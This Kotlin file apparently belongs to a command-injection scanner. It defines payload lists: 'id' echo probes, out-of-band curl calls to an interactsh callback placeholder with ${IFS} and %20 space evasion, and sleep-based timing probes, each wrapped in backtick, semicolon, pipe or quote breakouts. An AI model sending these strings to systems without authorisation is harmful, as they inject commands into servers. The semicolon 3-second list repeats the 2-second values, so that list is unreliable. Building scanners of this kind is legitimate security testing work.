package rain.rce

class Payload {

    // 回现型 (Echo-based, results are reflected in the response)
    val EchoInject = listOf(
        "`id`",
        ";id;",
        "';id;'",
        "\";id;\""
    )

    // OOB
    val OOBInject = listOf(
        "`curl\${IFS}{{interactsh-url}}`",
        "|curl\${IFS}{{interactsh-url}}|",
        "'|curl\${IFS}{{interactsh-url}}|'",
        "\"|curl\${IFS}{{interactsh-url}}|\"",
        ";curl\${IFS}{{interactsh-url}};",
        "';curl\${IFS}{{interactsh-url}};'",
        "\";curl\${IFS}{{interactsh-url}};\"",
        "`curl%20{{interactsh-url}}`",
        "|curl%20{{interactsh-url}}|",
        "'|curl%20{{interactsh-url}}|'",
        "\"|curl%20{{interactsh-url}}|\"",
        ";curl%20{{interactsh-url}};",
        "';curl%20{{interactsh-url}};'",
        "\";curl%20{{interactsh-url}};\""
    )

    // Backtick sleep payloads
    val sleepInjectWithBackquotes_2 = listOf(
        "`sleep\${IFS}2`",
        "`sleep%202`",
    )
    val sleepInjectWithBackquotes_3 = listOf(
        "`sleep\${IFS}3`",
        "`sleep%203`"
    )

    // Semicolon sleep payloads
    val sleepInjectWithSemicolon_2 = listOf(
        ";sleep\${IFS}2;",
        ";sleep%202;",
    )
    val sleepInjectWithSemicolon_3 = listOf(
        ";sleep\${IFS}2;",
        ";sleep%202;",
    )

    // Single quote sleep payloads
    val sleepInjectWithSinglequotes_2 = listOf(
        "';sleep\${IFS}2;'",
        "';sleep%202;'"
    )
    val sleepInjectWithSinglequotes_3 = listOf(
        "';sleep\${IFS}3;'",
        "';sleep%203;'"
    )

    // Double quote sleep payloads
    val sleepInjectWithDoublequotes_2 = listOf(
        "\";sleep\${IFS}2;\"",
        "\";sleep%202;\"",
    )
    val sleepInjectWithDoublequotes_3 = listOf(
        "\";sleep\${IFS}3;\"",
        "\";sleep%203;\""
    )
}